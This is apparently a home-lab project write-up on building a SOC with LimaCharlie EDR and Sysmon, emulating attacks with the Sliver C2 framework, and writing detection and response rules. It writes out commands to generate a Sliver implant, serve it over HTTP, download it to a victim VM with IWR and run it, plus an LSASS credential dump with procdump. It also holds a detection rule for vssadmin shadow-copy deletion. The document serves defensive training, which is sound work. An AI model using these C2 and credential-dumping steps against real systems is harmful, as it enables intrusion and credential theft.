<h1>Creating A SOC & Defending Attacks</h1>

<h2>Introduction</h2>

This Project consists of steps on how to:
 <ol type = "1">
  
<li>Build a SOC using LimaCharlie's EDR solution</li>
<li>Setup a Command-and-control (C2) framework</li>
<li>Using Sliver C2 framework to emulate threat actor behaviors</li>
<li>Writing Detection & Response rules to alert for and block new incoming simulated attacks</li>
</ol>

<h2>Languages and Utilities Used</h2>

- <b>PowerShell</b> 
- <b><a href="https://www.vmware.com/content/vmware/vmware-published-sites/us/products/workstation-player/workstation-player-evaluation.html.html">VMware Workstation</a></b>
- <b><a href="https://limacharlie.io/">LimaCharlie's SecOps Cloud Platform</a></b>
- <b><a href="https://github.com/NextronSystems/ransomware-simulator">Florian Roth's Ransomware</a></b>
- <b><a href="https://bishopfox.com/tools/sliver">Sliver C2 Framework</a></b>
- <b>Python3</b>

<h2>Environments Used </h2>

- <b>Windows 11 VM</b> (Victim)
- <b>Ubuntu Linux VM</b> (Attacker)
- <b>Windows 10</b> (Security Operations Center)
<h2>Program walk-through:</h2>


<details><summary><h3>Part 1: Setting Up LimaCharlie 🛡</h3></summary>


<p align="center">
<u>First Download either <a href="https://www.virtualbox.org/wiki/Downloads">Oracle VM VirtualBox</a>, or <a href="https://www.vmware.com/content/vmware/vmware-published-sites/us/products/workstation-player/workstation-player-evaluation.html.html">VMWare Workstation</a> then install a <a href="https://ubuntu.com/download/server">Linux</a> and <a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">Windows 11</a> ISO:</u> 
 <br/>
<img src="https://i.imgur.com/jReyXB2.png" height="80%" width="80%" />
<br />
<br />
Install Sysmon and SwiftOnSecurity’s Sysmon config on your Windows VM to generate telemetry for LimaCharlie using these administrative powershell commands:  <br/>
  <ol type = "1">
   <li> <code>Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip </code></li>
   <li> <code>Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon</code></li>
   <li> <code>Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml</code></li>
   <li> <code>C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml</code></li> 
  </ol>
   <br />
   To Confirm Sysmon is running use these commands:
   <br />
   <code>Get-Service sysmon64</code>
   <br />
  <img src="https://i.imgur.com/WW1gzEB.png"/> </a>
   <br />
   <code> Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10</code>
   <br />
   <img src="https://i.imgur.com/j6cy6Aq.png" height="80%" width="80%" />


   <p align="center">
   Now Create an <a href="https://app.limacharlie.io/signup"> LimaCharlie account</a> on your Host machine or another VM. Create an organization using the "Extended Detection & Response Standard" Template. Once the organization is created add a sensor to your Windows 11 VM using the "x86-64.exe" architecture.

 In your Windows VM, open an Administrative PowerShell prompt and paste the following commands:
  <br />
  <ol type = "1">
 <li><code>cd C:\Users\User\Downloads</code></li>
  
<li> <code>Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe</code></li>
  
<li> <code>cmd.exe</code></li>
 
<li>Now The Command given by LimaCharlie "lc_sensor.exe -i xxxxxxxxxxxxxxxxxx"</li>

  </ol>
  <br />
  <p align="center">
  Press Finish once LimaCharlie Detects your new sensor. Next, configure LimaCharlie to use Sysmon.
   <ol type = "1">
  
  <li>In the left-side menu, click “Artifact Collection”</li>
  <li>Next to “Artifact Collection Rules” click “Add Rule”</li>
  <li>Name: windows-sysmon-logs</li>
  <li>Platforms: Windows</li>
  <li>Path Pattern: wel://Microsoft-Windows-Sysmon/Operational:*</li>
  <li>Retention Period: 10</li>
  
  </ol>
<p align="center">
  After Saving that rule LimaCharlie will start sending Sysmon logs to your timeline.
<img src="https://imgur.com/xnrCVKz.png"/>
</details>
 <details><summary> <h3>Part 2: Sliver C2 Framework :crossed_swords:</h3> </summary>

<p align="center">
Next is to set up Sliver in Linux, swap to your Linux VM, and run these commands:
</p>
<ol type = "1">
<li><code>wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server</code></li>
<li><code>chmod +x /usr/local/bin/sliver-server </code></li>
<li><code>apt install -y mingw-w64 </code></li>
  <li><code># Create our future working directory
mkdir -p /opt/sliver</code></li>
</ol>
<p align="center">
log in to the root and launch Sliver.
 <ol type = "1">
<li><code>sudo su</code></li>
<li><code>cd /opt/sliver</code></li>
<li><code>sliver-server</code></li>
 </ol>
 <p align="center">
  Generate a C2 payload using this command:
   
 <li> <code>#Use ifconfig to find your LinuxVM IP this might require an installation depending on your Linux ISO
generate --http [Your Linux VM IP] --save /opt/sliver</code></li>
   
 <p align="center">
 </br>
  Find the name of your C2 payload:
     <li><code> implants </code></li>
  <img src="https://imgur.com/GkvD1OS.png"/>

   <p align="center">
To easily install this newly generated C2 payload from your Linux VM to your Windows VM, it's possible to use a temporary web server using Python. Exit sliver and run this command in the terminal:
<li><code> python3 -m http.server 80 </code></li>
<p align="center">
Open up your Windows VM and download your C2 payload from that temporary web server by opening up an Administrative PowerShell console, and using this command:
<li><code> IWR -Uri http://[Your Linux VM IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe </code></li>
<p align="center">
Swapping back to your Linux VM relaunch Sliver and start an HTTP listener.
<li><code>http</code></li>
<p align="center">
Back in your Windows VM use this Administrative PowerShell command:
 
<li><code>C:\Users\User\Downloads\[payload_name].exe</code></li>

<p align="center">
Back on Sliver open your sessions, and interact with your new C2 session to verify the connection.
<ol type = "1">
<li><code>sessions</code></li>
<li><code>use [session_id]</code></li>
<li><code>whoami</code></li>
</ol>
<img src="https://imgur.com/8Yo04Zc.png"/>
<p align="center">


 </details>
<details><summary> <h3>Part 3: Launching Attacks :crossed_swords:</h3> </summary>

 
<p align="center">
 From here I Launched an LSASS credential dumping attack that threat actors can use to pull the credentials of current users and domain admins. This could potentially give threat actors a new attack vector to move laterally across a network.
<li><code>procdump -n lsass.exe -s lsass.dmp</code></li>

<p align="center">
 Also Testing out ransomware using <a href="https://github.com/NextronSystems/ransomware-simulator/">Florian Roth's Ransomware <a/>
<img src="https://imgur.com/UsWuijc.png"/>
 </details>
<details><summary> <h3>Part 4: Detecting and Blocking Attacks	🛡</h3></summary>
 
<p align="center">
After launching both attacks I used LimaCharlie's SIEM to look for threat actor behavior first finding the LSASS credential dumping attack using a Sensitive Process filter.
  <p align="center">
<img src="https://imgur.com/lHwq2DD.png"/>
 
<p align="center">
I then wrote a custom Detection & Response rule to Alert when LSASS is accessed, and send a report.
 
</p>
Detect:
 </br>
 <code>event: SENSITIVE_PROCESS_ACCESS
op: ends with
path: event/*/TARGET/FILE_PATH
value: lsass.exe</code>
 </br>
 </br>
 Respond:
  </br>
  <code>- action: report
  name: LSASS access</code>

 <p align="center">  
 After that, I moved on to the ransomware. First identifying a new process on the timeline that was caused by the ransomware.
   <p align="center">
<img src="https://imgur.com/eY1LEdq.png"/>
  
  <p align="center">   
Then Wrote Another D&R rule for sending alerts, but then took it a step up, and if this process was run again to also terminate the parent process. Which would also kill the c2 payload, and remove shell access from the attacker VM.

   </p>
Detect:
 </br>
 <code>  - op: is
    path: event/FILE_PATH
    value: C:\Windows\system32\vssadmin.exe
  - op: contains
    path: event/COMMAND_LINE
    value: 'delete'
  - op: contains
    path: event/COMMAND_LINE
    value: 'shadows'
  - op: contains
    path: event/COMMAND_LINE
    value: '/all' </code>
 </br>
 </br>
 </code>
 Respond:
 <code>- action: report
  name: vss_deletion_kill_it
- action: task
  command:
    - deny_tree
    - << routing/parent >> </code>
  </br>

### <img src="https://imgur.com/CD9phES.png"/>

   <p align="center">
Finally to confirm my new D&R rule was running properly. I restarted Florian Roth's Ransomware, and the process was killed immediately. A new detection alert will be sent to report this action.
     <p align="center">
<img src="https://imgur.com/q20aInI.png"/>
 </details>
